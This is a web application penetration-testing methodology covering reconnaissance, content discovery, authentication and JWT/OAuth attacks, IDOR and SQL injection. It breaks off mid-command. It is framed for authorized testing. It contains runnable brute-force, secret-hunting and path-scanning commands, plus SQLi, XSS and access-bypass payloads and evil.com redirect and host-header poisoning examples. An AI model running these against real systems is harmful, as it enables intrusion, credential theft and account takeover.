---
title: Web Vulnerabilities Methodology
description: A systematic, phase-by-phase methodology for discovering and exploiting web application vulnerabilities — from reconnaissance through post-exploitation — aligned with OWASP, PTES, and real-world bug bounty workflows.
navigation:
  icon: i-lucide-globe
---

## Introduction

Web application security testing isn't about randomly firing payloads — it's about **methodical, structured enumeration** that builds a complete picture of the attack surface before exploiting a single vulnerability. This methodology covers the full lifecycle from passive reconnaissance to chaining vulnerabilities for maximum impact.

::note
This methodology is **framework-agnostic** — it applies equally to bug bounty programs, penetration tests, red team engagements, and CTF challenges. Adapt the depth and scope to your rules of engagement.
::

::card-group
  ::card
  ---
  title: What This Covers
  icon: i-lucide-book-open
  ---
  - Complete recon → exploitation pipeline
  - OWASP Top 10 (2021) testing techniques
  - Authentication, authorization & logic flaws
  - Injection attacks (SQL, XSS, SSTI, SSRF, XXE)
  - API security testing methodology
  - Chaining vulnerabilities for real impact
  ::

  ::card
  ---
  title: Methodology Standards
  icon: i-lucide-shield-check
  ---
  - **OWASP Testing Guide v4.2**
  - **OWASP Top 10 — 2021**
  - **PTES** (Penetration Testing Execution Standard)
  - **WSTG** (Web Security Testing Guide)
  - **OWASP API Security Top 10**
  - **CWE/CVE** mapping throughout
  ::

  ::card
  ---
  title: Tools You'll Need
  icon: i-lucide-wrench
  ---
  - **Proxy:** Burp Suite / Caido / OWASP ZAP
  - **Browser:** Firefox + extensions (FoxyProxy, Wappalyzer)
  - **CLI:** curl, httpx, nuclei, ffuf, sqlmap
  - **Recon:** subfinder, amass, gau, waybackurls
  - **Wordlists:** SecLists, Assetnote
  ::

  ::card
  ---
  title: Rules of Engagement
  icon: i-lucide-scale
  ---
  - Always have **written authorization**
  - Respect **scope boundaries**
  - **Never** test in production unless explicitly allowed
  - Document everything — timestamps, requests, responses
  - Report vulnerabilities **responsibly**
  ::
::

::caution
Performing web application attacks without explicit written authorization is **illegal**. This methodology is for **authorized penetration testing**, **bug bounty programs with defined scope**, and **educational purposes** only.
::

---

## Methodology Overview

### The Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WEB APPLICATION TESTING METHODOLOGY                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Phase 1: RECONNAISSANCE                                               │
│  ├── Passive Recon (OSINT, DNS, certificates, archives)                │
│  ├── Active Recon (port scanning, service enumeration)                 │
│  └── Technology Fingerprinting (stack, frameworks, WAFs)               │
│           │                                                             │
│           ▼                                                             │
│  Phase 2: MAPPING & DISCOVERY                                          │
│  ├── Content Discovery (directories, files, endpoints)                 │
│  ├── Parameter Discovery (hidden params, API endpoints)                │
│  ├── Application Mapping (sitemap, functionality, roles)               │
│  └── Attack Surface Analysis (entry points, trust boundaries)          │
│           │                                                             │
│           ▼                                                             │
│  Phase 3: VULNERABILITY DISCOVERY                                      │
│  ├── Authentication Testing                                            │
│  ├── Authorization & Access Control                                    │
│  ├── Input Validation (injection, XSS, file upload)                    │
│  ├── Business Logic Flaws                                              │
│  ├── Session Management                                                │
│  └── Configuration & Deployment                                        │
│           │                                                             │
│           ▼                                                             │
│  Phase 4: EXPLOITATION & IMPACT                                        │
│  ├── Proof of Concept development                                      │
│  ├── Vulnerability chaining                                            │
│  ├── Impact demonstration                                              │
│  └── Post-exploitation (if in scope)                                   │
│           │                                                             │
│           ▼                                                             │
│  Phase 5: REPORTING                                                    │
│  ├── Vulnerability documentation                                       │
│  ├── Risk rating (CVSS, business impact)                               │
│  └── Remediation recommendations                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### OWASP Top 10 — 2021 Quick Reference

| # | Category | CWE Examples | Phase |
|---|---|---|---|
| A01 | **Broken Access Control** | CWE-200, CWE-284, CWE-639 | Authorization Testing |
| A02 | **Cryptographic Failures** | CWE-259, CWE-327, CWE-331 | Configuration Review |
| A03 | **Injection** | CWE-79, CWE-89, CWE-78 | Input Validation |
| A04 | **Insecure Design** | CWE-209, CWE-256, CWE-501 | Business Logic |
| A05 | **Security Misconfiguration** | CWE-16, CWE-611, CWE-1004 | Configuration Review |
| A06 | **Vulnerable Components** | CWE-1035, CWE-1104 | Technology Fingerprinting |
| A07 | **Auth & Identification Failures** | CWE-287, CWE-384, CWE-798 | Authentication Testing |
| A08 | **Software & Data Integrity** | CWE-502, CWE-829 | Input Validation |
| A09 | **Security Logging Failures** | CWE-117, CWE-223, CWE-778 | Configuration Review |
| A10 | **SSRF** | CWE-918 | Input Validation |

---

## Phase 1 — Reconnaissance

::tip
Spend **40–60%** of your total testing time on reconnaissance and mapping. The more you understand the application, the more efficiently you find vulnerabilities. Rushing to exploitation is the #1 mistake.
::

### 1.1 — Passive Reconnaissance

Gather information **without directly interacting** with the target. This leaves no logs on the target's systems.

::tabs
  :::tabs-item{icon="i-lucide-search" label="DNS & Subdomain Enumeration"}
  ```bash [Terminal — Subdomain Discovery]
  TARGET="example.com"

  # ── Passive subdomain enumeration ──────────────────────────────
  # subfinder — multiple passive sources
  subfinder -d $TARGET -all -silent -o subs_subfinder.txt

  # amass — comprehensive passive enum
  amass enum -passive -d $TARGET -o subs_amass.txt

  # assetfinder
  assetfinder --subs-only $TARGET > subs_assetfinder.txt

  # crt.sh — Certificate Transparency logs
  curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
    jq -r '.[].name_value' | sort -u > subs_crtsh.txt

  # ── Merge and deduplicate ──────────────────────────────────────
  cat subs_*.txt | sort -u > all_subdomains.txt
  echo "[*] Total unique subdomains: $(wc -l < all_subdomains.txt)"

  # ── Resolve live subdomains ────────────────────────────────────
  httpx -l all_subdomains.txt -silent -status-code -title -tech-detect \
    -o live_subdomains.txt

  # ── DNS record enumeration ─────────────────────────────────────
  # MX records (mail servers)
  dig MX $TARGET +short

  # TXT records (SPF, DKIM, DMARC — may reveal infrastructure)
  dig TXT $TARGET +short

  # NS records (nameservers)
  dig NS $TARGET +short

  # Zone transfer attempt (rarely works, always try)
  dig axfr $TARGET @ns1.$TARGET
  ```
  :::

  :::tabs-item{icon="i-lucide-archive" label="OSINT & Archives"}
  ```bash [Terminal — Historical Data & OSINT]
  TARGET="example.com"

  # ── Wayback Machine — historical URLs ──────────────────────────
  # Find old endpoints, removed pages, leaked parameters
  waybackurls $TARGET | sort -u > wayback_urls.txt

  # gau — getAllUrls (Wayback, Common Crawl, OTX, URLScan)
  gau $TARGET --threads 5 --o gau_urls.txt

  # waymore — extended archive search
  python3 waymore.py -i $TARGET -mode U -oU waymore_urls.txt

  # ── Filter for interesting patterns ────────────────────────────
  # API endpoints
  grep -iE "(api|v[0-9]|graphql|rest|swagger|openapi)" wayback_urls.txt > api_endpoints.txt

  # Files with potential secrets
  grep -iE "\.(json|xml|yaml|yml|conf|cfg|ini|env|bak|old|sql|log|txt)" \
    wayback_urls.txt > interesting_files.txt

  # Parameters (for injection testing later)
  grep "?" wayback_urls.txt | sort -u > parameterized_urls.txt

  # JavaScript files (may contain secrets, API keys, endpoints)
  grep -iE "\.js(\?|$)" wayback_urls.txt | sort -u > js_files.txt

  # ── Google Dorking ─────────────────────────────────────────────
  # site:example.com filetype:pdf
  # site:example.com inurl:admin
  # site:example.com intitle:"index of"
  # site:example.com ext:xml | ext:json | ext:yaml
  # site:example.com inurl:api
  # "example.com" password | secret | token | api_key
  # site:pastebin.com "example.com"
  # site:github.com "example.com" password

  # ── Shodan / Censys ────────────────────────────────────────────
  shodan search "ssl.cert.subject.cn:example.com" --fields ip_str,port,org
  shodan search "hostname:example.com"
  ```
  :::

  :::tabs-item{icon="i-lucide-key-round" label="Credential & Secret Hunting"}
  ```bash [Terminal — Exposed Credentials]
  TARGET="example.com"

  # ── GitHub / GitLab dorking ────────────────────────────────────
  # Search for leaked credentials in public repos
  # Tools: trufflehog, gitleaks, gitrob

  # trufflehog — scan for secrets in repos
  trufflehog github --org=target-org --only-verified

  # Search GitHub manually:
  # "example.com" password
  # "example.com" api_key
  # "example.com" AWS_SECRET
  # "example.com" PRIVATE KEY
  # filename:.env "example.com"
  # filename:docker-compose "example.com"

  # ── Breach databases (authorized use only) ─────────────────────
  # dehashed.com
  # haveibeenpwned.com/API
  # intelx.io
  # leakpeek.com

  # ── S3 bucket enumeration ──────────────────────────────────────
  # Common patterns:
  # example.com, example-com, example-backup, example-dev,
  # example-staging, example-assets, example-uploads

  # cloud_enum — multi-cloud enumeration
  python3 cloud_enum.py -k example -k example.com

  # ── JS file secret extraction ──────────────────────────────────
  # Download and analyze JavaScript files for hardcoded secrets
  cat js_files.txt | while read url; do
    curl -s "$url" | grep -oiE "(api[_-]?key|secret|token|password|auth|bearer)\s*[:=]\s*['\"][^'\"]{8,}['\"]"
  done | sort -u > js_secrets.txt

  # LinkFinder — find API endpoints in JS
  python3 linkfinder.py -i https://example.com -d -o js_endpoints.txt

  # SecretFinder — find secrets in JS
  python3 SecretFinder.py -i https://example.com -e -o js_found_secrets.txt
  ```
  :::
::

### 1.2 — Active Reconnaissance

Directly interact with the target to discover services, technologies, and configurations.

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Port & Service Scanning"}
  ```bash [Terminal — Port Scanning]
  TARGET_IP="10.10.10.100"

  # ── Quick scan — top ports ─────────────────────────────────────
  nmap -sV --top-ports 1000 -oN scan_quick.txt $TARGET_IP

  # ── Full TCP scan ──────────────────────────────────────────────
  nmap -sC -sV -p- -oA scan_full $TARGET_IP

  # ── UDP scan (common web-related ports) ────────────────────────
  nmap -sU --top-ports 50 -oN scan_udp.txt $TARGET_IP

  # ── Masscan — fast large-scale scanning ────────────────────────
  masscan $TARGET_IP -p0-65535 --rate 1000 -oL scan_masscan.txt

  # ── Targeted web server scan ───────────────────────────────────
  nmap -sV -p 80,443,8080,8443,8000,8888,3000,5000,9090 \
    --script http-title,http-headers,http-methods,http-enum \
    -oN scan_web.txt $TARGET_IP
  ```
  :::

  :::tabs-item{icon="i-lucide-cpu" label="Technology Fingerprinting"}
  ```bash [Terminal — Stack Identification]
  TARGET="https://example.com"

  # ── Wappalyzer CLI ─────────────────────────────────────────────
  # Identify frameworks, CMS, libraries, CDN, analytics
  wappalyzer $TARGET

  # ── WhatWeb — detailed fingerprinting ──────────────────────────
  whatweb $TARGET -a 3 -v

  # ── HTTP headers analysis ──────────────────────────────────────
  curl -sI $TARGET | tee headers.txt

  # Key headers to examine:
  # Server:           → Web server (Apache, Nginx, IIS)
  # X-Powered-By:     → Backend framework (PHP, ASP.NET, Express)
  # X-AspNet-Version:  → .NET version
  # Set-Cookie:        → Session mechanism (PHPSESSID, JSESSIONID, etc.)
  # X-Frame-Options:   → Clickjacking protection
  # Content-Security-Policy: → XSS protection
  # Strict-Transport-Security: → HSTS

  # ── Check common CMS paths ────────────────────────────────────
  # WordPress
  curl -s "$TARGET/wp-login.php" -o /dev/null -w "%{http_code}"
  curl -s "$TARGET/wp-json/wp/v2/users" | jq '.[] | .slug'

  # Drupal
  curl -s "$TARGET/CHANGELOG.txt" | head -5

  # Joomla
  curl -s "$TARGET/administrator/" -o /dev/null -w "%{http_code}"

  # ── WAF detection ──────────────────────────────────────────────
  wafw00f $TARGET
  nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint $TARGET_IP

  # Manual WAF detection — send a clearly malicious request
  curl -s "$TARGET/?id=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
  curl -s "$TARGET/?id=1' OR 1=1--" -o /dev/null -w "%{http_code}"
  # 403 or custom error page → likely WAF
  ```
  :::
::

::warning
Always check for **WAF/CDN** (Cloudflare, Akamai, AWS WAF) before active testing. It affects your payloads, rate limiting, and may block your IP. Use WAF bypass techniques when detected.
::

### 1.3 — Technology Stack Checklist

Use this checklist to record the identified stack:

::collapsible

| Component | Finding | Testing Impact |
|---|---|---|
| **Web Server** | Apache / Nginx / IIS / Node.js | Server-specific vulns, default pages |
| **Language** | PHP / Python / Java / .NET / Ruby / Node.js | Injection types, serialization |
| **Framework** | Laravel / Django / Spring / Express / Rails / ASP.NET | Known CVEs, default routes |
| **CMS** | WordPress / Drupal / Joomla / Custom | Plugin vulns, admin panels |
| **Database** | MySQL / PostgreSQL / MSSQL / MongoDB / SQLite | SQLi syntax, stacked queries |
| **CDN/WAF** | Cloudflare / Akamai / AWS WAF / None | Bypass techniques needed |
| **JavaScript** | React / Vue / Angular / jQuery / Vanilla | DOM XSS, client-side logic |
| **API Format** | REST / GraphQL / SOAP / gRPC | Specific testing methodology |
| **Auth Method** | Session / JWT / OAuth / SAML / Basic | Token attacks, flow bypass |
| **Hosting** | AWS / Azure / GCP / On-prem / Shared | Cloud-specific misconfigs |

::

---

## Phase 2 — Mapping & Discovery

### 2.1 — Content Discovery

::tabs
  :::tabs-item{icon="i-lucide-folder-search" label="Directory & File Brute-forcing"}
  ```bash [Terminal — Content Discovery]
  TARGET="https://example.com"

  # ── ffuf — fast web fuzzer (recommended) ───────────────────────
  # General directory discovery
  ffuf -u "$TARGET/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -mc 200,204,301,302,307,401,403,405 \
    -fc 404 \
    -t 50 \
    -o ffuf_dirs.json \
    -of json

  # File discovery (with extensions)
  ffuf -u "$TARGET/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -e .php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.txt,.bak,.old,.sql,.zip,.tar.gz,.env,.config \
    -mc 200,204,301,302,307 \
    -fc 404 \
    -t 50 \
    -o ffuf_files.json

  # API endpoint discovery
  ffuf -u "$TARGET/api/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200,204,301,302,307,401,403,405 \
    -t 40 \
    -o ffuf_api.json

  # ── gobuster — alternative ─────────────────────────────────────
  gobuster dir -u $TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,txt,html,bak \
    -t 50 \
    -o gobuster_output.txt

  # ── feroxbuster — recursive scanning ───────────────────────────
  feroxbuster -u $TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -x php,html,txt,json \
    --depth 3 \
    -t 50 \
    -o ferox_output.txt

  # ── Virtual host / subdomain bruteforce ────────────────────────
  ffuf -u "https://FUZZ.example.com" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -mc 200,204,301,302,307 \
    -fs 0 \
    -t 50

  # Or with Host header fuzzing
  ffuf -u "$TARGET" \
    -H "Host: FUZZ.example.com" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -mc 200 \
    -fs 4242    # Filter by response size to remove false positives
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Sensitive File Checks"}
  ```bash [Terminal — Known Sensitive Paths]
  TARGET="https://example.com"

  # ── Check each path and report status ──────────────────────────
  PATHS=(
    # Version control
    ".git/HEAD"
    ".git/config"
    ".svn/entries"
    ".hg/requires"
    
    # Configuration & environment
    ".env"
    ".env.local"
    ".env.production"
    ".env.backup"
    "config.php"
    "config.yml"
    "config.json"
    "wp-config.php"
    "web.config"
    "appsettings.json"
    "application.yml"
    "application.properties"
    "database.yml"
    "settings.py"
    ".htaccess"
    "nginx.conf"
    
    # Backup & debug
    "backup.zip"
    "backup.sql"
    "database.sql"
    "dump.sql"
    "debug.log"
    "error.log"
    "access.log"
    "phpinfo.php"
    "info.php"
    "test.php"
    
    # API documentation (info disclosure)
    "swagger.json"
    "swagger.yaml"
    "openapi.json"
    "openapi.yaml"
    "api-docs"
    "swagger-ui.html"
    "graphql"
    "graphiql"
    "altair"
    
    # Admin panels
    "admin"
    "administrator"
    "admin/login"
    "wp-admin"
    "cpanel"
    "phpmyadmin"
    "adminer.php"
    
    # Cloud metadata
    "actuator"
    "actuator/env"
    "actuator/health"
    ".aws/credentials"
    
    # Common framework paths
    "server-status"
    "server-info"
    "elmah.axd"
    "trace.axd"
    "wp-json/wp/v2/users"
    
    # robots.txt & sitemap (always check first!)
    "robots.txt"
    "sitemap.xml"
    "sitemap_index.xml"
    "crossdomain.xml"
    "security.txt"
    ".well-known/security.txt"
  )

  echo "[*] Checking sensitive paths on $TARGET..."
  for path in "${PATHS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path" --max-time 5)
    if [[ "$STATUS" == "200" ]] || [[ "$STATUS" == "301" ]] || [[ "$STATUS" == "302" ]]; then
      echo "[!] $STATUS → $TARGET/$path"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-variable" label="Parameter Discovery"}
  ```bash [Terminal — Hidden Parameters]
  TARGET="https://example.com/page"

  # ── Arjun — parameter discovery ────────────────────────────────
  arjun -u "$TARGET" -t 10 -o arjun_params.json

  # Arjun with specific methods
  arjun -u "$TARGET" -m GET POST JSON -t 10

  # ── x8 — fast parameter brute-forcer ───────────────────────────
  x8 -u "$TARGET" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

  # ── Manual — ffuf parameter fuzzing ────────────────────────────
  # GET parameters
  ffuf -u "$TARGET?FUZZ=test" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs 4242 \
    -mc 200

  # POST parameters (form data)
  ffuf -u "$TARGET" \
    -X POST \
    -d "FUZZ=test" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs 4242

  # JSON body parameters
  ffuf -u "$TARGET" \
    -X POST \
    -d '{"FUZZ":"test"}' \
    -H "Content-Type: application/json" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs 4242

  # Header-based parameters
  ffuf -u "$TARGET" \
    -H "FUZZ: test" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs 4242
  ```
  :::
::

### 2.2 — Application Mapping

Before testing, build a **complete map** of the application's functionality:

::card-group
  ::card
  ---
  title: Sitemap Construction
  icon: i-lucide-map
  ---
  - Browse every visible page
  - Follow all links systematically
  - Submit all forms (with test data)
  - Use Burp Suite **Spider/Crawler** passively
  - Note all **entry points** (forms, APIs, uploads)
  - Map **user roles** and functionality differences
  ::

  ::card
  ---
  title: Functionality Inventory
  icon: i-lucide-clipboard-list
  ---
  Catalog every feature:
  - Registration / Login / Password reset
  - Profile editing / Settings
  - Search functionality
  - File upload / download
  - Payment / Checkout flows
  - Admin / Dashboard panels
  - API endpoints (REST/GraphQL)
  - Export / Import features
  - Messaging / Notifications
  ::

  ::card
  ---
  title: Authentication Flows
  icon: i-lucide-lock
  ---
  Map all auth mechanisms:
  - Login (username/password, SSO, OAuth)
  - Registration (email verification?)
  - Password reset (email link? security questions?)
  - MFA/2FA (SMS? TOTP? Push?)
  - Session management (cookies? JWT? API keys?)
  - Remember-me functionality
  - Account lockout behavior
  ::

  ::card
  ---
  title: Trust Boundaries
  icon: i-lucide-shield
  ---
  Identify where privilege changes:
  - Public → Authenticated
  - User → Admin
  - Frontend → Backend API
  - Client-side → Server-side validation
  - Internal network → External access
  - Application → Database / File system
  ::
::

::tip
Use **Burp Suite's Target → Site Map** to automatically build a visual map as you browse. Enable **passive crawling** to capture all requests flowing through the proxy.
::

---

## Phase 3 — Vulnerability Discovery

### 3.1 — Authentication Testing

::accordion
  :::accordion-item{icon="i-lucide-log-in" label="Brute Force & Credential Attacks"}

  ::field-group
    ::field{name="WSTG-ATHN-03" type="OWASP"}
    Test for weak lock-out mechanisms and brute force resistance.
    ::
  ::

  ```bash [Terminal — Credential Attacks]
  TARGET="https://example.com/login"

  # ── Hydra — brute force login ──────────────────────────────────
  # HTTP POST form
  hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    example.com http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials" \
    -t 10 -f

  # Basic Auth
  hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    example.com http-get / -s 443 -S

  # ── ffuf — username enumeration via response differences ───────
  # Check if "Invalid username" vs "Invalid password" differs
  ffuf -u "$TARGET" \
    -X POST \
    -d "username=FUZZ&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    -mr "Invalid password"    # Match response indicating user exists

  # ── Timing-based enumeration ───────────────────────────────────
  # Valid users may take longer (password hash comparison)
  for user in admin administrator root test guest; do
    TIME=$(curl -s -o /dev/null -w "%{time_total}" \
      -X POST "$TARGET" \
      -d "username=$user&password=wrongpassword123")
    echo "$user: ${TIME}s"
  done
  ```

  **Checklist:**
  - [ ] Test default credentials (`admin:admin`, `admin:password`, `test:test`)
  - [ ] Check for username enumeration (different error messages)
  - [ ] Test account lockout (does it exist? How many attempts?)
  - [ ] Test lockout bypass (IP rotation, header manipulation)
  - [ ] Check rate limiting on login endpoint
  - [ ] Test credential stuffing with known breach lists
  :::

  :::accordion-item{icon="i-lucide-key" label="Password Reset Flaws"}

  ```http [Burp Suite — Password Reset Tests]
  ### Test 1: Token predictability
  # Request multiple reset tokens and analyze patterns
  # Are they sequential? Time-based? Short?

  ### Test 2: Token reuse
  # Use a reset token, then try using it again
  POST /reset-password HTTP/1.1
  Content-Type: application/json

  {"token": "abc123", "new_password": "NewPass1!"}
  # Does it work a second time?

  ### Test 3: Host header injection (password reset poisoning)
  POST /forgot-password HTTP/1.1
  Host: evil.com
  Content-Type: application/json

  {"email": "victim@example.com"}
  # Does the reset link use evil.com as the host?
  # Variations:
  # Host: example.com
  # X-Forwarded-Host: evil.com
  #
  # Host: evil.com
  # X-Forwarded-For: evil.com

  ### Test 4: IDOR on reset endpoint
  POST /reset-password HTTP/1.1
  Content-Type: application/json

  {"user_id": "OTHER_USER_ID", "token": "MY_TOKEN", "new_password": "hacked"}

  ### Test 5: Rate limiting on reset
  # Can you send 1000 reset emails? → Email bombing / DoS
  ```

  **Checklist:**
  - [ ] Is the reset token sufficiently random? (Entropy analysis)
  - [ ] Does the token expire? (Try after 24h, 48h)
  - [ ] Can the token be reused after password is changed?
  - [ ] Is the token tied to a specific user?
  - [ ] Host header injection for link poisoning
  - [ ] Is there rate limiting on password reset requests?
  - [ ] Does the reset invalidate existing sessions?
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="JWT & Token Attacks"}

  ```bash [Terminal — JWT Analysis]
  # ── Decode JWT (without verification) ──────────────────────────
  # JWT format: header.payload.signature
  echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.sig" | \
    cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

  # ── jwt_tool — comprehensive JWT testing ───────────────────────
  python3 jwt_tool.py <JWT_TOKEN> -T    # Tamper mode

  # Test: Algorithm confusion (none)
  python3 jwt_tool.py <JWT_TOKEN> -X a  # alg:none attack

  # Test: HMAC key brute-force
  python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

  # Test: RS256 → HS256 confusion
  python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem

  # Test: JWK injection
  python3 jwt_tool.py <JWT_TOKEN> -X i

  # Test: kid injection
  python3 jwt_tool.py <JWT_TOKEN> -X s -I -pc user -pv admin
  ```

  | Attack | Technique | Check |
  |---|---|---|
  | `alg: none` | Remove signature, set algorithm to "none" | Does the server accept unsigned tokens? |
  | Key confusion | Change RS256 → HS256, sign with public key | Does the server use public key as HMAC secret? |
  | Weak secret | Brute-force the HMAC signing key | Is the secret a dictionary word? |
  | `kid` injection | Set `kid` header to `../../etc/passwd` or SQL | Is `kid` used in file path or DB query? |
  | JWK/JKU injection | Embed or point to attacker-controlled key | Does the server fetch keys from JWK/JKU? |
  | Claim tampering | Change `role`, `admin`, `user_id` claims | Is authorization based solely on JWT claims? |
  | Expiration bypass | Change/remove `exp` claim | Does the server enforce token expiration? |

  ::note
  Always check what happens when you modify JWT claims **without re-signing**. Some implementations only parse the payload and never verify the signature.
  ::
  :::

  :::accordion-item{icon="i-lucide-link" label="OAuth / SSO Flaws"}

  ```http [Burp Suite — OAuth Testing]
  ### Test 1: Open redirect in redirect_uri
  GET /authorize?response_type=code
    &client_id=CLIENT_ID
    &redirect_uri=https://evil.com/callback
    &scope=openid
  # Does it redirect with the auth code to evil.com?

  ### Test 2: redirect_uri bypass techniques
  # Subdomain: https://evil.example.com/callback
  # Path traversal: https://example.com/callback/../../../evil.com
  # Parameter pollution: redirect_uri=https://legit.com&redirect_uri=https://evil.com
  # Fragment: https://example.com/callback#@evil.com
  # URL encoding: https://example.com%40evil.com/callback

  ### Test 3: CSRF in OAuth flow
  # Is the 'state' parameter present and validated?
  # Can you initiate an OAuth flow and have the victim complete it?

  ### Test 4: Authorization code reuse
  # Can the same authorization code be used multiple times?

  ### Test 5: Scope escalation
  # Request: scope=read
  # Change to: scope=read write admin
  # Does the server grant elevated permissions?

  ### Test 6: Token leakage
  # Check Referer header after redirect — does it contain the token?
  # Check browser history for tokens in URLs
  ```
  :::
::

### 3.2 — Authorization & Access Control (IDOR / BAC)

::badge
**A01:2021 — Broken Access Control** (OWASP #1)
::

::steps{level="4"}

#### Horizontal Privilege Escalation (IDOR)

Access other users' data by manipulating identifiers.

```http [Burp Suite — IDOR Testing]
### Test every endpoint with user-specific data

# Original request (your user)
GET /api/users/1337/profile HTTP/1.1
Authorization: Bearer <YOUR_TOKEN>

# Change to another user's ID
GET /api/users/1338/profile HTTP/1.1
Authorization: Bearer <YOUR_TOKEN>
# Can you see user 1338's data?

# Try different ID formats
GET /api/users/1/profile            # Sequential integer
GET /api/orders/00001               # Zero-padded
GET /api/docs/a1b2c3d4              # Short hash/UUID
GET /api/files/../../etc/passwd     # Path traversal in ID
GET /api/users/admin@example.com    # Email as identifier

# Test in different contexts
GET /api/users/1338/orders          # Other user's orders
PUT /api/users/1338/profile         # Modify other user's profile
DELETE /api/users/1338/address      # Delete other user's data
GET /api/invoices/INV-2024-0042     # Sequential invoice IDs
GET /api/uploads/report-final.pdf   # Predictable filenames
```

#### Vertical Privilege Escalation

Access admin or higher-privileged functionality as a standard user.

```http [Burp Suite — Vertical Escalation]
### Access admin endpoints with regular user token
GET /admin/dashboard HTTP/1.1
Authorization: Bearer <REGULAR_USER_TOKEN>

GET /api/admin/users HTTP/1.1
Authorization: Bearer <REGULAR_USER_TOKEN>

POST /api/admin/users/create HTTP/1.1
Authorization: Bearer <REGULAR_USER_TOKEN>
Content-Type: application/json

{"username": "hacker", "role": "admin"}

### Parameter-based role escalation
POST /api/profile/update HTTP/1.1
Content-Type: application/json
Authorization: Bearer <REGULAR_USER_TOKEN>

{"name": "Hacker", "role": "admin"}
{"name": "Hacker", "is_admin": true}
{"name": "Hacker", "permissions": ["read","write","admin"]}
{"name": "Hacker", "user_type": 0}

### Method-based access control bypass
# If GET is blocked, try:
POST /admin/dashboard HTTP/1.1
PUT /admin/dashboard HTTP/1.1
PATCH /admin/dashboard HTTP/1.1
OPTIONS /admin/dashboard HTTP/1.1
HEAD /admin/dashboard HTTP/1.1

# HTTP method override headers
GET /admin/dashboard HTTP/1.1
X-HTTP-Method-Override: POST
X-Method-Override: PUT
X-HTTP-Method: DELETE
```

#### Path-Based Access Control Bypass

```http [Burp Suite — Path Bypass Techniques]
### URL path manipulation
GET /admin/dashboard HTTP/1.1           → 403
GET /ADMIN/dashboard HTTP/1.1           → 200?
GET /admin/./dashboard HTTP/1.1         → 200?
GET /admin/../admin/dashboard HTTP/1.1  → 200?
GET //admin/dashboard HTTP/1.1          → 200?
GET /admin%2fdashboard HTTP/1.1         → 200?
GET /admin;/dashboard HTTP/1.1          → 200? (Tomcat)
GET /.;/admin/dashboard HTTP/1.1        → 200? (Spring)
GET /admin/dashboard.json HTTP/1.1      → 200?
GET /admin/dashboard%00 HTTP/1.1        → 200? (null byte)
GET /admin/dashboard/ HTTP/1.1          → 200? (trailing slash)
GET /admin/dashboard%23 HTTP/1.1        → 200? (# encoded)

### Header-based bypass
GET /admin/dashboard HTTP/1.1
X-Original-URL: /admin/dashboard
X-Rewrite-URL: /admin/dashboard
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

::

::tip
**IDOR is the #1 most common web vulnerability** in bug bounty programs. Test every endpoint that returns user-specific data by changing the identifier. Use Burp Suite's **Autorize** extension to automate authorization testing.
::

---

### 3.3 — Injection Attacks

::tabs
  :::tabs-item{icon="i-lucide-database" label="SQL Injection (SQLi)"}

  ::badge
  **A03:2021 — Injection** | CWE-89
  ::

  ```bash [Terminal — SQLi Detection & Exploitation]
  TARGET="https://example.com"

  # ── Manual detection payloads ──────────────────────────────────
  # Error-based detection
  # ' → SQL error?
  # '' → No error? (escaped single quote)
  # 1' OR '1'='1 → Different response?
  # 1' OR '1'='2 → Same as original?
  # 1' AND '1'='1 → Same as original?
  # 1' AND '1'='2 → Different response?
  # 1 AND 1=1 → (numeric context)
  # 1 AND 1=2

  # ── Boolean-based blind detection ──────────────────────────────
  # ?id=1 AND 1=1    → Normal response
  # ?id=1 AND 1=2    → Different response (empty/error)
  # If responses differ → Boolean blind SQLi confirmed

  # ── Time-based blind detection ─────────────────────────────────
  # MySQL:    ?id=1' AND SLEEP(5)-- -
  # MSSQL:    ?id=1'; WAITFOR DELAY '0:0:5'-- -
  # PostgreSQL: ?id=1'; SELECT pg_sleep(5)-- -
  # Oracle:   ?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
  # SQLite:   ?id=1' AND randomblob(500000000)-- -

  # ── sqlmap — automated exploitation ────────────────────────────
  # Basic scan
  sqlmap -u "$TARGET/product?id=1" --batch --random-agent

  # With cookie/session
  sqlmap -u "$TARGET/product?id=1" \
